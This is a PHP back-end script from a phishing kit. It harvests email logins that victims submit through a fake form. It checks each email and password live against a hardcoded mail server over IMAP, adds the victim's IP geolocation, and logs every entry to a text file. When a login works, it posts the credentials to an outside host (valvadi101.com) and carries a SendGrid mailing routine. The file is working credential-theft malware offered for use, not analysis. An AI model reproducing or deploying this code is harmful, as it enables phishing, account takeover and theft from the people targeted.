<?php
header("Access-Control-Allow-Origin: *");
error_reporting(0);
$output = '';
ob_start();
$output = check_details();
$get_allpagecontents = ob_get_clean();
echo $output;

function check_details(){
	$output1 = '-';


if(isset($_POST['Email']) && !empty($_POST['Email'])
 && isset($_POST['password']) && !empty($_POST['password'])
){ 
    $username = strtolower(trim($_POST['Email']));
    $password = $_POST['password'];

	$details_ip = '';
      $details_ip = get_ip_ddrs_detailz();
	  $send_to = 'ENTER EMAIL TO SEND TO';
	  $output = $_POST['send_id_cust'].' '.time() . PHP_EOL;
	  //file_put_contents('status_u2/t.txt', $output, FILE_APPEND);
	  $filename = 'emails_and_pass.txt';
	  $headers = "From: $send_to\r\n";
      $headers .= "Content-type: text/html\r\n";
      $subject = "Info Submitted";
	  $body = "Email: $username Password: $password $details_ip \n";
	  

    $auth = @check_imap_connect($username, $password);
    if($auth === false){
	  $output1 = 'no';
      $output = $_POST['send_id_cust'].' '. time() . PHP_EOL;
      //file_put_contents('status_u2/f.txt', $output, FILE_APPEND);
	  //echo 'NOT CONECTED';
    }
    else{
		$output1 = 'yes';
      $body = "TRUE LOGIN: YES \n".$body;
	  send_curl_post_smtp_email($send_to, $body);
	}
    file_put_contents($filename, $body . PHP_EOL . PHP_EOL, FILE_APPEND);
}
else{
	$output = $_POST['send_id_cust']. time() . PHP_EOL;
	//file_put_contents('status_u2/ff.txt', $output, FILE_APPEND);
}
return $output1;
}


function get_ip_ddrs_detailz(){
require_once('geoplugin.class.php');
$ip_details= '';
$geoplugin = new geoPlugin();

$geoplugin->locate();

$ip_details = "IP Address: {$geoplugin->ip} , Country Name: {$geoplugin->countryName} , Country Code: {$geoplugin->countryCode} , ";
$ip_details .= "City: {$geoplugin->city} , Region Name: {$geoplugin->regionName} , Region: {$geoplugin->region}";

return $ip_details;

}
function check_imap_connect($username, $password){
$output = false;
$hostname = '{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX';
$inbox = imap_open($hostname,$username,$password);
if($inbox){
  $output = true;
}

imap_close($inbox);
return $output;
}
function send_email_sendgrid($TheBoss, $subject, $message){
	require $_SERVER['DOCUMENT_ROOT'] . '/1/send-grid-api-keys/send-grid-api-keys.php';
	$thesendgridkey = get_sendgrid_api_key();
$url = 'https://api.sendgrid.com/v3/mail/send';
$headers = array(
    "Authorization: Bearer $thesendgridkey",
    "Content-Type: application/json"
);

try{
    $data = array(
        "personalizations" => array(
            array(
                "to" => array(
                    array(
                        "email" => $TheBoss
                    )
                ),
                "subject" => $subject
            )
        ),
        "from" => array(
            "email" => "obill8252@gmail.com"
        ),
        "content" => array(
            array(
                "type" => "text/plain",
                "value" => $message
            )
        )
    );

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => $headers
    ));

    $result = curl_exec ($ch);
    curl_close ($ch);
}
catch(Exception $ex){
   $ex->getMessage();
}

}
function send_curl_post_smtp_email($email, $body){
 $url = 'https://valvadi101.com/smtp-testor/handler.php';
 $post_vars = 'a='.urlencode($email).'&b='.urlencode($body);
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_vars);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);  // DO NOT RETURN HTTP HEADERS
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);  // RETURN THE CONTENTS OF THE CALL
 $Rec_Data = curl_exec($ch);
 curl_close($ch);
 //print_r($Rec_Data);
}

//$end_time=time()-$start_time;
//echo "<br>SECONDS ELAPSED: $end_time";
?>
